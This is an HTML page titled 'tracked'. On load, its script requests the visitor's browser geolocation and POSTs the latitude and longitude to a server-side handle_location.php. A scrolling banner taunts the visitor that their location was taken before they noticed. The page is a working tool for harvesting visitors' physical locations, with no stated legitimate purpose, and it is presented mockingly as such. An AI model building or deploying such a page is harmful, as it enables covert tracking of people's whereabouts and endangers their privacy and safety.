<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>tracked</title>
    <style>
        body {
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
        }
        marquee {
            background-color: #fff;
            border: 1px solid #ccc;
            padding: 10px;
        }
    </style>
</head>
<body>
    <script>
  // Function to run on page load
  window.onload = function() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(sendPositionToPHP, showError);
    } else {
      document.getElementById("status").innerHTML = "Geolocation is not supported by this browser.";
    }
  };

  // Success callback function
  function sendPositionToPHP(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;
    document.getElementById("status").innerHTML = "Location found, sending to server.";
    
    // Send to PHP using Fetch API
    fetch('handle_location.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ latitude: lat, longitude: lon }),
    })
    .then(response => response.json())
    .then(data => {
      console.log('Success:', data);
      document.getElementById("location-data").innerHTML = `PHP Response: ${data.message}`;
    })
    .catch((error) => {
      console.error('Error:', error);
    });
  }

  // Error callback function
  function showError(error) {
    switch(error.code) {
      case error.PERMISSION_DENIED:
        document.getElementById("status").innerHTML = "User denied the request for Geolocation."
        break;
      case error.POSITION_UNAVAILABLE:
        document.getElementById("status").innerHTML = "Location information is unavailable."
        break;
      case error.TIMEOUT:
        document.getElementById("status").innerHTML = "The request to get user location timed out."
        break;
      case error.UNKNOWN_ERROR:
        document.getElementById("status").innerHTML = "An unknown error occurred."
        break;
    }
  }
</script>
    <marquee behavior="scroll" direction="left"><h1><strong>Before you noticed it i got ur location.....</strong></h1></marquee>
    <p id="status"></p>
    <p id="location-data"></p>
</body>
</html>